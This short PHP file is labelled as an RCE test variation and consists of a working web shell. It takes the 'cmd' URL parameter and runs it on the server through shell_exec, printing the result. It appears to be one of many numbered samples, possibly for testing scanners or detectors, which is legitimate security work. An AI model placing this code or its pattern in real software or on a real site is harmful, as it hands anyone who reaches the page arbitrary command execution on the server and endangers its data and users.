<?php
// RCE test variation #537
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>